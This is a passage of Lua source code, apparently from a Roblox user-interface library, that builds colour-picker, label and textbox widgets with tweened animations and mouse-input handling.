                        			pcall(callback,randomSelectedValueOption[table.find(randomSelectedValueOption,opt)])
					else
						lib:notify(lib:ColorFonts(`Cannot find '{lib:ColorFonts(opt,"underline")}'`,"Bold,Red"),10)
					end -- end
				end
			end
		end
			
		function ahhts:EditText(str)
			DropdownTitle.Text = str
		end
			
            Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
		return ahhts
        end
        function tabcontent:Colorpicker(text, preset, callback, descToggle)
            local ColorPickerToggled = false
            local OldToggleColor = Color3.fromRGB(0, 0, 0)
            local OldColor = Color3.fromRGB(0, 0, 0)
            local OldColorSelectionPosition = nil
            local OldHueSelectionPosition = nil
            local ColorH, ColorS, ColorV = 1, 1, 1
            local RainbowColorPicker = false
            local ColorPickerInput = nil
            local ColorInput = nil
            local HueInput = nil

            local Colorpicker = Instance.new("Frame")
            local ColorpickerCorner = Instance.new("UICorner")
            local ColorpickerTitle = Instance.new("TextLabel")
            local BoxColor = Instance.new("Frame")
            local BoxColorCorner = Instance.new("UICorner")
            local ConfirmBtn = Instance.new("TextButton")
            local ConfirmBtnCorner = Instance.new("UICorner")
            local ConfirmBtnTitle = Instance.new("TextLabel")
            local ColorpickerBtn = Instance.new("TextButton")
            local RainbowToggle = Instance.new("TextButton")
            local RainbowToggleCorner = Instance.new("UICorner")
            local RainbowToggleTitle = Instance.new("TextLabel")
            local FrameRainbowToggle1 = Instance.new("Frame")
            local FrameRainbowToggle1Corner = Instance.new("UICorner")
            local FrameRainbowToggle2 = Instance.new("Frame")
            local FrameRainbowToggle2_2 = Instance.new("UICorner")
            local FrameRainbowToggle3 = Instance.new("Frame")
            local FrameToggle3 = Instance.new("UICorner")
            local FrameRainbowToggleCircle = Instance.new("Frame")
            local FrameRainbowToggleCircleCorner = Instance.new("UICorner")
            local Color = Instance.new("ImageLabel")
            local ColorCorner = Instance.new("UICorner")
            local ColorSelection = Instance.new("ImageLabel")
            local Hue = Instance.new("ImageLabel")
            local HueCorner = Instance.new("UICorner")
            local HueGradient = Instance.new("UIGradient")
            local HueSelection = Instance.new("ImageLabel")

            Colorpicker.Name = "Colorpicker"
            Colorpicker.Parent = Tab
            Colorpicker.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Colorpicker.ClipsDescendants = true
            Colorpicker.Position = UDim2.new(-0.541071415, 0, -0.532915354, 0)
            Colorpicker.Size = UDim2.new(0, 363, 0, 42)

            ColorpickerCorner.CornerRadius = UDim.new(0, 5)
            ColorpickerCorner.Name = "ColorpickerCorner"
            ColorpickerCorner.Parent = Colorpicker

            ColorpickerTitle.Name = "ColorpickerTitle"
            ColorpickerTitle.Parent = Colorpicker
            ColorpickerTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ColorpickerTitle.BackgroundTransparency = 1.000
            ColorpickerTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            ColorpickerTitle.Size = UDim2.new(0, 187, 0, 42)
            ColorpickerTitle.Font = Enum.Font.Gotham
            ColorpickerTitle.Text = text
            ColorpickerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            ColorpickerTitle.TextSize = 14.000
            ColorpickerTitle.TextXAlignment = Enum.TextXAlignment.Left
            ColorpickerTitle.RichText = true
			
            local ToggleDesc = Instance.new("TextLabel")
	    ToggleDesc.Name = "ColorpickerDesc"
            ToggleDesc.Parent = Colorpicker
            ToggleDesc.BackgroundColor3 = Color3.fromRGB(255,255,255)
            ToggleDesc.BackgroundTransparency = 1.000
            ToggleDesc.Position = UDim2.new(0.0358126722,0,0.160,0)
            ToggleDesc.Size = UDim2.new(0,187,0,42)
            ToggleDesc.Font = Enum.Font.Gotham
            ToggleDesc.Text = ""
            ToggleDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
            ToggleDesc.TextSize = 12.000
            ToggleDesc.TextXAlignment = Enum.TextXAlignment.Left
            ToggleDesc.RichText = true
	    ToggleDesc.Visible = false

	    TurtleFlags[text .. " desc"] = function(descName)
		if typeof(descName) ~= "nil" then
			ToggleDesc.Visible = true
			TweenService:Create(ColorpickerTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,-0.160,0)}):Play()
			if typeof(descName) == "string" or typeof(descName) == "number" then
				ToggleDesc.Text = lib:ColorFonts(descName,TurtleFlags.DescTextStyle)
				--TweenService:Create(Toggle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.215625003,0,0.446271926,TabLayout.AbsoluteContentSize.Y)}):Play()
				if descName ~= "" then
					TweenService:Create(ColorpickerTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,-0.160,0)}):Play()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
				else
					TweenService:Create(ColorpickerTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,0,0)}):Play()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
				end
			else
				task.spawn(function()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
					wait(0.3)
					ToggleDesc.Text = lib:ColorFonts("Only accept A-Z, a-z & 0-9 not a " .. typeof(descName),TurtleFlags.DescTextStyle)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
					wait(1)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
					wait(0.3)
					ToggleDesc.Text = lib:ColorFonts(descName,TurtleFlags.DescTextStyle)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
				end)
			end
		else
			TweenService:Create(ColorpickerTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,0,0)}):Play()
			TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
		end
	    end

	    TurtleFlags[text .. " desc"](descToggle)
            BoxColor.Name = "BoxColor"
            BoxColor.Parent = ColorpickerTitle
            BoxColor.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
            BoxColor.Position = UDim2.new(1.60427809, 0, 0.214285716, 0)
            BoxColor.Size = UDim2.new(0, 41, 0, 23)

            BoxColorCorner.CornerRadius = UDim.new(0, 5)
            BoxColorCorner.Name = "BoxColorCorner"
            BoxColorCorner.Parent = BoxColor

            ConfirmBtn.Name = "ConfirmBtn"
            ConfirmBtn.Parent = ColorpickerTitle
            ConfirmBtn.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            ConfirmBtn.Position = UDim2.new(1.25814295, 0, 1.09037197, 0)
            ConfirmBtn.Size = UDim2.new(0, 105, 0, 32)
            ConfirmBtn.AutoButtonColor = false
            ConfirmBtn.Font = Enum.Font.SourceSans
            ConfirmBtn.Text = ""
            ConfirmBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            ConfirmBtn.TextSize = 14.000

            ConfirmBtnCorner.CornerRadius = UDim.new(0, 5)
            ConfirmBtnCorner.Name = "ConfirmBtnCorner"
            ConfirmBtnCorner.Parent = ConfirmBtn

            ConfirmBtnTitle.Name = "ConfirmBtnTitle"
            ConfirmBtnTitle.Parent = ConfirmBtn
            ConfirmBtnTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ConfirmBtnTitle.BackgroundTransparency = 1.000
            ConfirmBtnTitle.Size = UDim2.new(0, 33, 0, 32)
            ConfirmBtnTitle.Font = Enum.Font.Gotham
            ConfirmBtnTitle.Text = "Confirm"
            ConfirmBtnTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            ConfirmBtnTitle.TextSize = 14.000
            ConfirmBtnTitle.TextXAlignment = Enum.TextXAlignment.Left

            ColorpickerBtn.Name = "ColorpickerBtn"
            ColorpickerBtn.Parent = ColorpickerTitle
            ColorpickerBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ColorpickerBtn.BackgroundTransparency = 1.000
            ColorpickerBtn.Size = UDim2.new(0, 363, 0, 42)
            ColorpickerBtn.Font = Enum.Font.SourceSans
            ColorpickerBtn.Text = ""
            ColorpickerBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            ColorpickerBtn.TextSize = 14.000

            RainbowToggle.Name = "RainbowToggle"
            RainbowToggle.Parent = ColorpickerTitle
            RainbowToggle.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            RainbowToggle.Position = UDim2.new(1.26349044, 0, 2.12684202, 0)
            RainbowToggle.Size = UDim2.new(0, 104, 0, 32)
            RainbowToggle.AutoButtonColor = false
            RainbowToggle.Font = Enum.Font.SourceSans
            RainbowToggle.Text = ""
            RainbowToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
            RainbowToggle.TextSize = 14.000

            RainbowToggleCorner.CornerRadius = UDim.new(0, 5)
            RainbowToggleCorner.Name = "RainbowToggleCorner"
            RainbowToggleCorner.Parent = RainbowToggle

            RainbowToggleTitle.Name = "RainbowToggleTitle"
            RainbowToggleTitle.Parent = RainbowToggle
            RainbowToggleTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            RainbowToggleTitle.BackgroundTransparency = 1.000
            RainbowToggleTitle.Size = UDim2.new(0, 33, 0, 32)
            RainbowToggleTitle.Font = Enum.Font.Gotham
            RainbowToggleTitle.Text = "Rainbow"
            RainbowToggleTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            RainbowToggleTitle.TextSize = 14.000
            RainbowToggleTitle.TextXAlignment = Enum.TextXAlignment.Left

            FrameRainbowToggle1.Name = "FrameRainbowToggle1"
            FrameRainbowToggle1.Parent = RainbowToggle
            FrameRainbowToggle1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            FrameRainbowToggle1.Position = UDim2.new(0.649999976, 0, 0.186000004, 0)
            FrameRainbowToggle1.Size = UDim2.new(0, 37, 0, 18)

            FrameRainbowToggle1Corner.Name = "FrameRainbowToggle1Corner"
            FrameRainbowToggle1Corner.Parent = FrameRainbowToggle1

            FrameRainbowToggle2.Name = "FrameRainbowToggle2"
            FrameRainbowToggle2.Parent = FrameRainbowToggle1
            FrameRainbowToggle2.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            FrameRainbowToggle2.Position = UDim2.new(0.0590000004, 0, 0.112999998, 0)
            FrameRainbowToggle2.Size = UDim2.new(0, 33, 0, 14)

            FrameRainbowToggle2_2.Name = "FrameRainbowToggle2"
            FrameRainbowToggle2_2.Parent = FrameRainbowToggle2

            FrameRainbowToggle3.Name = "FrameRainbowToggle3"
            FrameRainbowToggle3.Parent = FrameRainbowToggle1
            FrameRainbowToggle3.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            FrameRainbowToggle3.BackgroundTransparency = 1.000
            FrameRainbowToggle3.Size = UDim2.new(0, 37, 0, 18)

            FrameToggle3.Name = "FrameToggle3"
            FrameToggle3.Parent = FrameRainbowToggle3

            FrameRainbowToggleCircle.Name = "FrameRainbowToggleCircle"
            FrameRainbowToggleCircle.Parent = FrameRainbowToggle1
            FrameRainbowToggleCircle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            FrameRainbowToggleCircle.Position = UDim2.new(0.127000004, 0, 0.222000003, 0)
            FrameRainbowToggleCircle.Size = UDim2.new(0, 10, 0, 10)

            FrameRainbowToggleCircleCorner.Name = "FrameRainbowToggleCircleCorner"
            FrameRainbowToggleCircleCorner.Parent = FrameRainbowToggleCircle

            Color.Name = "Color"
            Color.Parent = ColorpickerTitle
            Color.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
            Color.Position = UDim2.new(0, 0, 0, 42)
            Color.Size = UDim2.new(0, 194, 0, 80)
            Color.ZIndex = 10
            Color.Image = "rbxassetid://4155801252"

            ColorCorner.CornerRadius = UDim.new(0, 3)
            ColorCorner.Name = "ColorCorner"
            ColorCorner.Parent = Color

            ColorSelection.Name = "ColorSelection"
            ColorSelection.Parent = Color
            ColorSelection.AnchorPoint = Vector2.new(0.5, 0.5)
            ColorSelection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ColorSelection.BackgroundTransparency = 1.000
            ColorSelection.Position = UDim2.new(preset and select(3, Color3.toHSV(preset)))
            ColorSelection.Size = UDim2.new(0, 18, 0, 18)
            ColorSelection.Image = "http://www.roblox.com/asset/?id=4805639000"
            ColorSelection.ScaleType = Enum.ScaleType.Fit
            ColorSelection.Visible = false

            Hue.Name = "Hue"
            Hue.Parent = ColorpickerTitle
            Hue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Hue.Position = UDim2.new(0, 202, 0, 42)
            Hue.Size = UDim2.new(0, 25, 0, 80)

            HueCorner.CornerRadius = UDim.new(0, 3)
            HueCorner.Name = "HueCorner"
            HueCorner.Parent = Hue

            HueGradient.Color =
                ColorSequence.new {
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)),
                ColorSequenceKeypoint.new(0.20, Color3.fromRGB(234, 255, 0)),
                ColorSequenceKeypoint.new(0.40, Color3.fromRGB(21, 255, 0)),
                ColorSequenceKeypoint.new(0.60, Color3.fromRGB(0, 255, 255)),
                ColorSequenceKeypoint.new(0.80, Color3.fromRGB(0, 17, 255)),
                ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 0, 251)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 4))
            }
            HueGradient.Rotation = 270
            HueGradient.Name = "HueGradient"
            HueGradient.Parent = Hue

            HueSelection.Name = "HueSelection"
            HueSelection.Parent = Hue
            HueSelection.AnchorPoint = Vector2.new(0.5, 0.5)
            HueSelection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            HueSelection.BackgroundTransparency = 1.000
            HueSelection.Position = UDim2.new(0.48, 0, 1 - select(1, Color3.toHSV(preset)))
            HueSelection.Size = UDim2.new(0, 18, 0, 18)
            HueSelection.Image = "http://www.roblox.com/asset/?id=4805639000"
            HueSelection.Visible = false

            coroutine.wrap(
                function()
                    while wait() do
                        FrameRainbowToggle3.BackgroundColor3 = PresetColor
                    end
                end
            )()

            ColorpickerBtn.MouseButton1Click:Connect(
                function()
                    if ColorPickerToggled == false then
                        ColorSelection.Visible = true
                        HueSelection.Visible = true
                        Colorpicker:TweenSize(
                            UDim2.new(0, 363, 0, 132),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        wait(.2)
                        Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
                    else
                        ColorSelection.Visible = false
                        HueSelection.Visible = false
                        Colorpicker:TweenSize(
                            UDim2.new(0, 363, 0, 42),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        wait(.2)
                        Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
                    end
                    ColorPickerToggled = not ColorPickerToggled
                end
            )

            local function UpdateColorPicker(nope)
                BoxColor.BackgroundColor3 = Color3.fromHSV(ColorH, ColorS, ColorV)
                Color.BackgroundColor3 = Color3.fromHSV(ColorH, 1, 1)

                pcall(callback, BoxColor.BackgroundColor3)
            end

            ColorH =
                1 -
                (math.clamp(HueSelection.AbsolutePosition.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) /
                    Hue.AbsoluteSize.Y)
            ColorS =
                (math.clamp(ColorSelection.AbsolutePosition.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) /
                Color.AbsoluteSize.X)
            ColorV =
                1 -
                (math.clamp(ColorSelection.AbsolutePosition.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) /
                    Color.AbsoluteSize.Y)

            BoxColor.BackgroundColor3 = preset
            Color.BackgroundColor3 = preset
            pcall(callback,BoxColor.BackgroundColor3)

            Color.InputBegan:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        if RainbowColorPicker then
                            return
                        end

                        if ColorInput then
                            ColorInput:Disconnect()
                        end

                        ColorInput =
                            RunService.RenderStepped:Connect(
                            function()
                                local ColorX =
                                    (math.clamp(Mouse.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) /
                                    Color.AbsoluteSize.X)
                                local ColorY =
                                    (math.clamp(Mouse.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) /
                                    Color.AbsoluteSize.Y)

                                ColorSelection.Position = UDim2.new(ColorX, 0, ColorY, 0)
                                ColorS = ColorX
                                ColorV = 1 - ColorY

                                UpdateColorPicker(true)
                            end
                        )
                    end
                end
            )

            Color.InputEnded:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        if ColorInput then
                            ColorInput:Disconnect()
                        end
                    end
                end
            )

            Hue.InputBegan:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        if RainbowColorPicker then
                            return
                        end

                        if HueInput then
                            HueInput:Disconnect()
                        end

                        HueInput =
                            RunService.RenderStepped:Connect(
                            function()
                                local HueY =
                                    (math.clamp(Mouse.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) /
                                    Hue.AbsoluteSize.Y)

                                HueSelection.Position = UDim2.new(0.48, 0, HueY, 0)
                                ColorH = 1 - HueY

                                UpdateColorPicker(true)
                            end
                        )
                    end
                end
            )

            Hue.InputEnded:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        if HueInput then
                            HueInput:Disconnect()
                        end
                    end
                end
            )

            RainbowToggle.MouseButton1Down:Connect(
                function()
                    RainbowColorPicker = not RainbowColorPicker

                    if ColorInput then
                        ColorInput:Disconnect()
                    end

                    if HueInput then
                        HueInput:Disconnect()
                    end

                    if RainbowColorPicker then
                        TweenService:Create(
                            FrameRainbowToggle1,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggle2,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggle3,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggleCircle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}
                        ):Play()
                        FrameRainbowToggleCircle:TweenPosition(
                            UDim2.new(0.587, 0, 0.222000003, 0),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )

                        OldToggleColor = BoxColor.BackgroundColor3
                        OldColor = Color.BackgroundColor3
                        OldColorSelectionPosition = ColorSelection.Position
                        OldHueSelectionPosition = HueSelection.Position

                        while RainbowColorPicker do
                            BoxColor.BackgroundColor3 = Color3.fromHSV(lib.RainbowColorValue, 1, 1)
                            Color.BackgroundColor3 = Color3.fromHSV(lib.RainbowColorValue, 1, 1)

                            ColorSelection.Position = UDim2.new(1, 0, 0, 0)
                            HueSelection.Position = UDim2.new(0.48, 0, 0, lib.HueSelectionPosition)

                            pcall(callback,BoxColor.BackgroundColor3)
                            wait()
                        end
                    elseif not RainbowColorPicker then
                        TweenService:Create(
                            FrameRainbowToggle1,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggle2,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggle3,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggleCircle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}
                        ):Play()
                        FrameRainbowToggleCircle:TweenPosition(
                            UDim2.new(0.127000004, 0, 0.222000003, 0),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )

                        BoxColor.BackgroundColor3 = OldToggleColor
                        Color.BackgroundColor3 = OldColor

                        ColorSelection.Position = OldColorSelectionPosition
                        HueSelection.Position = OldHueSelectionPosition

                        pcall(callback,BoxColor.BackgroundColor3)
                    end
                end
            )

            ConfirmBtn.MouseButton1Click:Connect(
                function()
                    ColorSelection.Visible = false
                    HueSelection.Visible = false
                    Colorpicker:TweenSize(
                        UDim2.new(0, 363, 0, 42),
                        Enum.EasingDirection.Out,
                        Enum.EasingStyle.Quart,
                        .2,
                        true
                    )
                    wait(.2)
                    Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
                end
            )
            Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
        end
        function tabcontent:Label(text)
            local Label = Instance.new("TextButton")
            local LabelCorner = Instance.new("UICorner")
            local LabelTitle = Instance.new("TextLabel")
	    local lbl = {}
			
            Label.Name = "Button"
            Label.Parent = Tab
            Label.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Label.Size = UDim2.new(0,363,0,42)
            Label.AutoButtonColor = false
            Label.Font = Enum.Font.SourceSans
            Label.Text = ""
            Label.TextColor3 = Color3.fromRGB(0, 0, 0)
            Label.TextSize = 14.000
	    Label.BackgroundTransparency = 1
	
            LabelCorner.CornerRadius = UDim.new(0, 5)
            LabelCorner.Name = "ButtonCorner"
            LabelCorner.Parent = Label

            LabelTitle.Name = "ButtonTitle"
            LabelTitle.Parent = Label
            LabelTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            LabelTitle.BackgroundTransparency = 1
            LabelTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            LabelTitle.Size = UDim2.new(0,363,0,42) --UDim2.new(0,187,0,42)
            LabelTitle.Font = Enum.Font.Gotham
            LabelTitle.Text = text
            LabelTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            LabelTitle.TextSize = 14.000
            LabelTitle.TextXAlignment = Enum.TextXAlignment.Left
            LabelTitle.RichText = true
	    LabelTitle.TextWrapped = true
			
            Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
	    LabelTitle.Size = UDim2.new(0,187,0,LabelTitle.TextBounds.Y)
            Label.Size = UDim2.new(0,363,0,LabelTitle.TextBounds.Y + 35)
	    LabelTitle:GetPropertyChangedSignal("Text"):Connect(function()
		LabelTitle.Size = UDim2.new(0,187,0,LabelTitle.TextBounds.Y)
                Label.Size = UDim2.new(0,363,0,LabelTitle.TextBounds.Y + 35)
		Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
	    end)
			
	 function lbl:EditLabel(str)
		LabelTitle.Text = str
	 end
			
	 function lbl:GetText()
		return LabelTitle.Text
	 end
		return lbl
        end
        function tabcontent:Textbox(text,disapper,callback,max)
            local Textbox = Instance.new("Frame")
            local TextboxCorner = Instance.new("UICorner")
            local TextboxTitle = Instance.new("TextLabel")
            local TextboxFrame = Instance.new("Frame")
            local TextboxFrameCorner = Instance.new("UICorner")
            local TextBox = Instance.new("TextBox")
	    local tablehandler = {}
	    local limit = max or "no limits"
			
            Textbox.Name = "Textbox"
            Textbox.Parent = Tab
            Textbox.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Textbox.ClipsDescendants = true
            Textbox.Position = UDim2.new(-0.541071415, 0, -0.532915354, 0)
            Textbox.Size = UDim2.new(0, 363, 0, 42)

            TextboxCorner.CornerRadius = UDim.new(0, 5)
            TextboxCorner.Name = "TextboxCorner"
            TextboxCorner.Parent = Textbox

            TextboxTitle.Name = "TextboxTitle"
            TextboxTitle.Parent = Textbox
            TextboxTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextboxTitle.BackgroundTransparency = 1.000
            TextboxTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            TextboxTitle.Size = UDim2.new(0, 187, 0, 42)
            TextboxTitle.Font = Enum.Font.Gotham
            TextboxTitle.Text = text
            TextboxTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextboxTitle.TextSize = 14.000
            TextboxTitle.TextXAlignment = Enum.TextXAlignment.Left
            TextboxTitle.RichText = true
			
            local ToggleDesc = Instance.new("TextLabel")
	    ToggleDesc.Name = "TextboxDesc"
            ToggleDesc.Parent = Textbox
            ToggleDesc.BackgroundColor3 = Color3.fromRGB(255,255,255)
            ToggleDesc.BackgroundTransparency = 1.000
            ToggleDesc.Position = UDim2.new(0.0358126722,0,0.160,0)
            ToggleDesc.Size = UDim2.new(0,187,0,42)
            ToggleDesc.Font = Enum.Font.Gotham
            ToggleDesc.Text = ""
            ToggleDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
            ToggleDesc.TextSize = 12.000
            ToggleDesc.TextXAlignment = Enum.TextXAlignment.Left
            ToggleDesc.RichText = true
	    ToggleDesc.Visible = false

	    TurtleFlags[text .. " desc"] = function(descName)
		if typeof(descName) ~= "nil" then
			ToggleDesc.Visible = true
			TweenService:Create(TextboxTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,-0.160,0)}):Play()
			if typeof(descName) == "string" or typeof(descName) == "number" then
				ToggleDesc.Text = lib:ColorFonts(descName,TurtleFlags.DescTextStyle)
				--TweenService:Create(Toggle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.215625003,0,0.446271926,TabLayout.AbsoluteContentSize.Y)}):Play()
				if descName ~= "" then
					TweenService:Create(TextboxTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,-0.160,0)}):Play()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
				else
					TweenService:Create(TextboxTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,0,0)}):Play()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
				end
			else
				task.spawn(function()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
					wait(0.3)
					ToggleDesc.Text = lib:ColorFonts("Only accept A-Z, a-z & 0-9 not a " .. typeof(descName),TurtleFlags.DescTextStyle)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
					wait(1)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
					wait(0.3)
					ToggleDesc.Text = lib:ColorFonts(descName,TurtleFlags.DescTextStyle)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
				end)
			end
		else
			TweenService:Create(TextboxTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,0,0)}):Play()
			TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
		end
	    end

	    TurtleFlags[text .. " desc"](descToggle)
            TextboxFrame.Name = "TextboxFrame"
            TextboxFrame.Parent = TextboxTitle
            TextboxFrame.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
            TextboxFrame.Position = UDim2.new(1.28877008, 0, 0.214285716, 0)
            TextboxFrame.Size = UDim2.new(0, 100, 0, 23)

            TextboxFrameCorner.CornerRadius = UDim.new(0, 5)
            TextboxFrameCorner.Name = "TextboxFrameCorner"
            TextboxFrameCorner.Parent = TextboxFrame

            TextBox.Parent = TextboxFrame
            TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.BackgroundTransparency = 1.000
            TextBox.Size = UDim2.new(0, 100, 0, 23)
            TextBox.Font = Enum.Font.Gotham
            TextBox.Text = ""
            TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.TextSize = 14.000

            TextBox.FocusLost:Connect(
                function(ep)
                    if ep then
                        if #TextBox.Text > 0 then
